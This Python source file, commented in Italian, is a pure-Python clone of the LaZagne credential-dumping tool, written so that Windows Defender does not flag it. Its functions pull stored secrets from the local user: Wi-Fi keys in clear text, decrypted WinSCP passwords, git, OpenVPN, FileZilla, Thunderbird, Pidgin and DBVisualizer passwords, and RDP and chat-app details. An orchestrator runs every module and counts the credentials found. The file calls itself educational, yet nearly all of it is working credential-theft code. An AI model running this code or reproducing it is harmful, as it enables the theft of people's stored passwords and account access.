"""LaZagne-light: replica pura-Python delle funzionalita' piu' usate.

Implementa le categorie LaZagne piu' ad alto valore senza dipendere
dal binario originale (Defender PUA-flagged). Tutto in user-mode.

Categorie:
  - wifi          - Profili Wi-Fi salvati + chiave in chiaro (netsh)
  - putty         - Sessioni PuTTY salvate (registry, no pwd)
  - winscp        - Sessioni WinSCP + decryption password (algoritmo pubblico)
  - openssh       - Chiavi SSH (ridondante con infostealer_targets)
  - git           - .git-credentials (plaintext!)
  - openvpn       - .ovpn con auth-user-pass file
  - thunderbird   - NSS database (riusa firefox_nss)
  - filezilla     - sitemanager.xml con password
  - cisco_vpn     - Cisco AnyConnect profili (server, gruppi)
  - pidgin        - accounts.xml chat (plaintext!)
  - dbvisualizer  - dbvis.xml SQL clients

NB: tutti gli algoritmi sono PUBBLICI e documentati (man pages, source code,
RFC, ecc.). Lo scopo educativo e' identico a LaZagne: mostrare cosa un
malware locale recupererebbe.
"""
from __future__ import annotations
import base64
import json
import os
import re
import subprocess
import sys
import xml.etree.ElementTree as ET
from pathlib import Path

try:
    import winreg
except ImportError:
    winreg = None

# Reuse moduli sibling
sys.path.insert(0, str(Path(__file__).parent))
try:
    from firefox_nss import (decrypt_firefox_logins,
                              discover_firefox_profiles as _ff_discover)
except ImportError:
    decrypt_firefox_logins = None
    _ff_discover = None


HOME = Path(os.environ.get("USERPROFILE", "~"))
ROAMING = Path(os.environ.get("APPDATA", ""))
LOCAL = Path(os.environ.get("LOCALAPPDATA", ""))
PROGDATA = Path(os.environ.get("PROGRAMDATA", "C:\\ProgramData"))


# ============================================================
# 1. WIFI (netsh)
# ============================================================
def audit_wifi() -> list[dict]:
    """Lista profili Wi-Fi con chiave in chiaro (richiede admin per la key).

    Ritorna lista vuota se il servizio wlansvc non e' attivo (desktop senza
    scheda wireless) o se nessun profilo salvato.
    """
    try:
        r = subprocess.run(
            ["netsh", "wlan", "show", "profiles"],
            capture_output=True, text=True, timeout=10,
            errors="replace",
        )
    except Exception:
        return []
    # Detect wireless service not running (match locale-agnostic via "wlansvc")
    combined = (r.stdout + r.stderr).lower()
    if "wlansvc" in combined:
        # Il servizio e' menzionato fuori dalla lista normale = errore
        if ("esecuzione" in combined or "running" in combined
                or "in execution" in combined):
            return [{"_status": "wireless_service_not_running",
                     "_note": "Servizio Wi-Fi (wlansvc) non in esecuzione "
                              "(es. desktop senza scheda wireless o servizio "
                              "disabilitato)."}]
    if r.returncode != 0:
        return []

    names = []
    for line in r.stdout.splitlines():
        if "Profilo Utente Tutti" in line or "All User Profile" in line:
            names.append(line.split(":", 1)[1].strip())

    profiles = []
    for n in names:
        entry = {"ssid": n, "key": None, "auth": None,
                 "cipher": None, "type": None}
        try:
            r2 = subprocess.run(
                ["netsh", "wlan", "show", "profile",
                 f"name={n}", "key=clear"],
                capture_output=True, text=True, timeout=10,
            )
            if r2.returncode == 0:
                for line in r2.stdout.splitlines():
                    line = line.strip()
                    if line.startswith("Contenuto chiave") or line.startswith("Key Content"):
                        entry["key"] = line.split(":", 1)[1].strip()
                    elif (line.startswith("Autenticazione") or line.startswith("Authentication")):
                        v = line.split(":", 1)[1].strip()
                        if v and v not in ("Aperta",):
                            entry["auth"] = v
                    elif line.startswith("Cifratura") or line.startswith("Cipher"):
                        entry["cipher"] = line.split(":", 1)[1].strip()
                    elif line.startswith("Tipo di sicurezza") or line.startswith("Security key"):
                        entry["type"] = line.split(":", 1)[1].strip()
        except Exception:
            pass
        profiles.append(entry)
    return profiles


# ============================================================
# 2. PUTTY (registry, NO passwords - PuTTY doesn't store SSH pwd)
# ============================================================
def audit_putty() -> list[dict]:
    """Sessioni PuTTY salvate (host, port, user). PuTTY NON salva password SSH."""
    if not winreg:
        return []
    out = []
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\SimonTatham\PuTTY\Sessions") as k:
            i = 0
            while True:
                try:
                    name = winreg.EnumKey(k, i)
                    i += 1
                    entry = {"session": name}
                    try:
                        with winreg.OpenKey(k, name) as sk:
                            for field in ("HostName", "UserName", "PortNumber",
                                          "Protocol", "PublicKeyFile",
                                          "ProxyHost", "ProxyUsername"):
                                try:
                                    v, _ = winreg.QueryValueEx(sk, field)
                                    entry[field] = v
                                except FileNotFoundError:
                                    pass
                    except OSError:
                        pass
                    out.append(entry)
                except OSError:
                    break
    except (FileNotFoundError, OSError):
        pass
    return out


# ============================================================
# 3. WINSCP (registry + decryption con algoritmo pubblico)
# ============================================================
# Algoritmo WinSCP (pubblico, dalla loro stessa documentazione + decompilation
# di vari open source decryptor su GitHub):
#   - Password e' stringa hex encoded
#   - Magic byte iniziale: 0xFF
#   - Pattern XOR (PWALG_SIMPLE_MAGIC) usato come stream cipher
PW_MAGIC = 0xA3
PW_FLAG = 0xFF


def _winscp_dec_next_char(pw_hex: str) -> tuple[int, str]:
    """Decifra un singolo byte dalla rappresentazione hex."""
    if len(pw_hex) < 2:
        return 0, pw_hex
    try:
        b = int(pw_hex[:2], 16)
    except ValueError:
        return 0, ""
    val = (~((b ^ PW_MAGIC) - PW_FLAG)) & 0xFF
    return val, pw_hex[2:]


def _winscp_decrypt(encrypted_hex: str, host: str, username: str) -> str | None:
    """Decifra password WinSCP. encrypted_hex e' il valore RAW da Password regkey."""
    try:
        rest = encrypted_hex
        # Step 1: flag
        flag, rest = _winscp_dec_next_char(rest)
        if flag == PW_FLAG:
            # Skip flags marker
            _, rest = _winscp_dec_next_char(rest)
            length, rest = _winscp_dec_next_char(rest)
        else:
            length = flag
        # Step 2: dummy bytes
        to_be_decoded, rest = _winscp_dec_next_char(rest)
        rest = rest[to_be_decoded * 2:]
        # Step 3: extract length chars
        chars = []
        for _ in range(length):
            v, rest = _winscp_dec_next_char(rest)
            chars.append(chr(v))
        result = "".join(chars)
        # Step 4: strip key prefix (host+username)
        key = username + host
        if result.startswith(key):
            return result[len(key):]
        return result
    except Exception:
        return None


def audit_winscp() -> list[dict]:
    """Sessioni WinSCP salvate. Decifra password dove possibile."""
    if not winreg:
        return []
    out = []
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Martin Prikryl\WinSCP 2\Sessions") as k:
            i = 0
            while True:
                try:
                    name = winreg.EnumKey(k, i)
                    i += 1
                    if name == "Default%20Settings":
                        continue
                    entry = {"session": name, "decrypted_password": None}
                    try:
                        with winreg.OpenKey(k, name) as sk:
                            for field in ("HostName", "UserName", "PortNumber",
                                          "FSProtocol", "PublicKeyFile"):
                                try:
                                    v, _ = winreg.QueryValueEx(sk, field)
                                    entry[field] = v
                                except FileNotFoundError:
                                    pass
                            # Encrypted password
                            try:
                                pwd_hex, _ = winreg.QueryValueEx(sk, "Password")
                                host = entry.get("HostName", "")
                                user = entry.get("UserName", "")
                                entry["password_present"] = bool(pwd_hex)
                                if pwd_hex and host and user:
                                    entry["decrypted_password"] = (
                                        _winscp_decrypt(pwd_hex, host, user))
                            except FileNotFoundError:
                                entry["password_present"] = False
                    except OSError:
                        pass
                    out.append(entry)
                except OSError:
                    break
    except (FileNotFoundError, OSError):
        pass
    return out


# ============================================================
# 4. GIT CREDENTIALS (plaintext!)
# ============================================================
def audit_git_credentials() -> list[dict]:
    """Legge ~/.git-credentials e ~/.gitconfig per credential helper.

    .git-credentials e' PLAINTEXT in formato:
      https://user:password@host
    """
    out = []
    candidates = [
        HOME / ".git-credentials",
        HOME / "AppData/Local/GitCredentialManager/store",
    ]
    for c in candidates:
        if not c.exists():
            continue
        try:
            for line in c.read_text(encoding="utf-8", errors="ignore").splitlines():
                line = line.strip()
                if not line:
                    continue
                # Parse URL with embedded credentials
                m = re.match(r"(https?)://([^:]+):([^@]+)@(.+)", line)
                if m:
                    scheme, user, pwd, host = m.groups()
                    out.append({
                        "source": str(c),
                        "url": f"{scheme}://{host}",
                        "username": user,
                        "password": pwd,
                    })
        except Exception:
            pass
    return out


# ============================================================
# 5. OPENVPN (auth-user-pass file)
# ============================================================
def audit_openvpn() -> list[dict]:
    """Cerca .ovpn con auth-user-pass + relativi file di credenziali."""
    out = []
    cfg_dirs = [
        Path("C:/Program Files/OpenVPN/config"),
        HOME / "OpenVPN/config",
        ROAMING / "OpenVPN/config",
    ]
    for cfg_dir in cfg_dirs:
        if not cfg_dir.exists():
            continue
        for ovpn in cfg_dir.glob("*.ovpn"):
            entry = {"config": str(ovpn), "username": None, "password": None,
                     "auth_file": None}
            try:
                text = ovpn.read_text(encoding="utf-8", errors="ignore")
                # Cerca 'auth-user-pass <file>'
                m = re.search(r"^auth-user-pass\s+(\S+)", text, re.M)
                if m:
                    auth_file = m.group(1).strip('"')
                    # Path relativo o assoluto
                    auth_path = Path(auth_file)
                    if not auth_path.is_absolute():
                        auth_path = cfg_dir / auth_file
                    if auth_path.exists():
                        try:
                            lines = auth_path.read_text(encoding="utf-8",
                                                        errors="ignore").splitlines()
                            if len(lines) >= 1:
                                entry["username"] = lines[0].strip()
                            if len(lines) >= 2:
                                entry["password"] = lines[1].strip()
                            entry["auth_file"] = str(auth_path)
                        except Exception:
                            pass
            except Exception:
                pass
            out.append(entry)
    return out


# ============================================================
# 6. FILEZILLA (sitemanager.xml decrypt)
# ============================================================
def audit_filezilla() -> list[dict]:
    """Parse FileZilla sitemanager.xml + recentservers.xml."""
    out = []
    candidates = [
        ROAMING / "FileZilla/sitemanager.xml",
        ROAMING / "FileZilla/recentservers.xml",
    ]
    for path in candidates:
        if not path.exists():
            continue
        try:
            tree = ET.parse(path)
            root = tree.getroot()
            for server in root.iter("Server"):
                entry = {"source": str(path), "host": None, "port": None,
                         "user": None, "password": None}
                for tag in ("Host", "Port", "User", "Pass", "Name"):
                    el = server.find(tag)
                    if el is not None and el.text:
                        # Pass puo' essere base64-encoded (FileZilla recente)
                        if tag == "Pass":
                            enc = el.attrib.get("encoding", "")
                            if enc == "base64":
                                try:
                                    entry["password"] = base64.b64decode(el.text).decode(
                                        "utf-8", errors="replace")
                                except Exception:
                                    entry["password"] = el.text
                            else:
                                entry["password"] = el.text
                        elif tag == "Host":
                            entry["host"] = el.text
                        elif tag == "Port":
                            entry["port"] = el.text
                        elif tag == "User":
                            entry["user"] = el.text
                        elif tag == "Name":
                            entry["name"] = el.text
                if entry.get("host"):
                    out.append(entry)
        except Exception:
            pass
    return out


# ============================================================
# 7. THUNDERBIRD (riusa firefox_nss su path Thunderbird)
# ============================================================
def audit_thunderbird() -> list[dict]:
    """Thunderbird usa stesso NSS di Firefox."""
    out = []
    if not decrypt_firefox_logins:
        return out
    tb_root = ROAMING / "Thunderbird/Profiles"
    if not tb_root.exists():
        return out
    for prof in tb_root.iterdir():
        if not prof.is_dir():
            continue
        if not (prof / "key4.db").exists():
            continue
        try:
            creds = decrypt_firefox_logins(prof)
            for c in creds:
                out.append({
                    "profile": prof.name,
                    "host": c.get("url"),
                    "user": c.get("username"),
                    "password": c.get("password"),
                })
        except Exception:
            pass
    return out


# ============================================================
# 8. PIDGIN (accounts.xml plaintext)
# ============================================================
def audit_pidgin() -> list[dict]:
    """Pidgin salva accounts.xml in PLAINTEXT."""
    out = []
    acc = ROAMING / ".purple" / "accounts.xml"
    if not acc.exists():
        return out
    try:
        tree = ET.parse(acc)
        for account in tree.iter("account"):
            entry = {}
            for tag in ("protocol", "name", "password"):
                el = account.find(tag)
                if el is not None:
                    entry[tag] = el.text
            if entry:
                out.append(entry)
    except Exception:
        pass
    return out


# ============================================================
# 9. CISCO ANYCONNECT (profili)
# ============================================================
def audit_cisco_anyconnect() -> list[dict]:
    """Profili Cisco AnyConnect. Server e gruppi visibili."""
    out = []
    profile_dir = PROGDATA / "Cisco/Cisco AnyConnect Secure Mobility Client/Profile"
    if not profile_dir.exists():
        # Anche under Program Files
        alt = Path("C:/Program Files (x86)/Cisco/Cisco AnyConnect Secure Mobility Client/Profile")
        if alt.exists():
            profile_dir = alt
        else:
            return out
    for xml in profile_dir.rglob("*.xml"):
        try:
            tree = ET.parse(xml)
            root = tree.getroot()
            for host in root.iter():
                if host.tag.endswith("HostAddress") and host.text:
                    out.append({"profile": xml.name, "host": host.text.strip()})
        except Exception:
            pass
    return out


# ============================================================
# 10. DBVISUALIZER (~/.dbvis/config*/dbvis.xml)
# ============================================================
def audit_dbvisualizer() -> list[dict]:
    """DBVisualizer salva connessioni in dbvis.xml. Password "cifrata" facile."""
    out = []
    base = HOME / ".dbvis"
    if not base.exists():
        return out
    for cfg in base.glob("config*/dbvis.xml"):
        try:
            tree = ET.parse(cfg)
            for db in tree.iter("Database"):
                entry = {"source": str(cfg)}
                for tag in ("Alias", "Driver", "Url", "UserId"):
                    el = db.find(tag)
                    if el is not None:
                        entry[tag.lower()] = el.text
                # Password e' base64 encoded (formato precedente) o
                # custom AES (formato recente con master key)
                pwd_el = db.find("Password")
                if pwd_el is not None and pwd_el.text:
                    enc = pwd_el.attrib.get("Encoded", "")
                    if enc == "true":
                        try:
                            entry["password_b64"] = pwd_el.text
                            entry["password"] = base64.b64decode(
                                pwd_el.text).decode("utf-8", errors="replace")
                        except Exception:
                            entry["password_b64"] = pwd_el.text
                    else:
                        entry["password"] = pwd_el.text
                out.append(entry)
        except Exception:
            pass
    return out


# ============================================================
# 11. SLACK / DISCORD / TEAMS local tokens (presenza)
# ============================================================
def audit_chat_tokens() -> dict:
    """Detection-only: presenza app chat con session token recuperabili."""
    apps = {
        "Slack": ROAMING / "Slack/Local Storage/leveldb",
        "Microsoft Teams": ROAMING / "Microsoft/Teams/Local Storage/leveldb",
        "Telegram Desktop": ROAMING / "Telegram Desktop/tdata",
        "Element (Matrix)": ROAMING / "Element/Local Storage/leveldb",
        "Signal Desktop": ROAMING / "Signal/sql",
        "WhatsApp Desktop": ROAMING / "WhatsApp",
    }
    out = {}
    for name, path in apps.items():
        out[name] = {"present": path.exists(), "path": str(path)}
    return out


# ============================================================
# 12. RDP saved credentials (.rdp files)
# ============================================================
def audit_rdp_files() -> list[dict]:
    """Cerca file .rdp salvati con credenziali."""
    out = []
    search_paths = [
        HOME / "Documents",
        HOME / "Desktop",
        HOME / "Downloads",
    ]
    for sp in search_paths:
        if not sp.exists():
            continue
        for rdp in sp.glob("*.rdp"):
            try:
                text = rdp.read_text(encoding="utf-16", errors="ignore")
                if not text:
                    text = rdp.read_text(encoding="utf-8", errors="ignore")
                host_match = re.search(r"full address:s:([^\r\n]+)", text)
                user_match = re.search(r"username:s:([^\r\n]+)", text)
                entry = {
                    "file": str(rdp),
                    "host": host_match.group(1).strip() if host_match else None,
                    "username": user_match.group(1).strip() if user_match else None,
                    "has_encrypted_password": "password 51:b:" in text,
                }
                out.append(entry)
            except Exception:
                pass
    return out


# ============================================================
# ORCHESTRATORE
# ============================================================
def run_lazagne_light() -> dict:
    """Esegue tutti i moduli. Ritorna dict structured."""
    return {
        "wifi": audit_wifi(),
        "putty": audit_putty(),
        "winscp": audit_winscp(),
        "git_credentials": audit_git_credentials(),
        "openvpn": audit_openvpn(),
        "filezilla": audit_filezilla(),
        "thunderbird": audit_thunderbird(),
        "pidgin": audit_pidgin(),
        "cisco_anyconnect": audit_cisco_anyconnect(),
        "dbvisualizer": audit_dbvisualizer(),
        "chat_tokens": audit_chat_tokens(),
        "rdp_files": audit_rdp_files(),
    }


def summary(results: dict) -> dict:
    """Conta items trovati per categoria + risk."""
    summary = {}
    wifi_list = results.get("wifi", [])
    # Skip sentinel "_status"
    real_wifi = [w for w in wifi_list if not w.get("_status")]
    summary["wifi_count"] = len(real_wifi)
    summary["wifi_with_key"] = sum(1 for w in real_wifi if w.get("key"))
    summary["wifi_service_unavailable"] = (
        bool(wifi_list) and wifi_list[0].get("_status") == "wireless_service_not_running"
    )
    summary["putty_sessions"] = len(results.get("putty", []))
    summary["winscp_sessions"] = len(results.get("winscp", []))
    summary["winscp_decrypted"] = sum(1 for s in results.get("winscp", [])
                                      if s.get("decrypted_password"))
    summary["git_creds"] = len(results.get("git_credentials", []))
    summary["openvpn_configs"] = len(results.get("openvpn", []))
    summary["openvpn_with_creds"] = sum(1 for o in results.get("openvpn", [])
                                        if o.get("password"))
    summary["filezilla_sites"] = len(results.get("filezilla", []))
    summary["filezilla_with_pwd"] = sum(1 for f in results.get("filezilla", [])
                                        if f.get("password"))
    summary["thunderbird_creds"] = len(results.get("thunderbird", []))
    summary["pidgin_accounts"] = len(results.get("pidgin", []))
    summary["cisco_vpn_profiles"] = len(results.get("cisco_anyconnect", []))
    summary["dbvisualizer_dbs"] = len(results.get("dbvisualizer", []))
    summary["chat_apps_present"] = sum(1 for v in results.get("chat_tokens", {}).values()
                                        if v.get("present"))
    summary["rdp_files"] = len(results.get("rdp_files", []))
    summary["total_credentials_found"] = (
        summary["wifi_with_key"] + summary["winscp_decrypted"] +
        summary["git_creds"] + summary["openvpn_with_creds"] +
        summary["filezilla_with_pwd"] + summary["thunderbird_creds"] +
        summary["pidgin_accounts"]
    )
    return summary
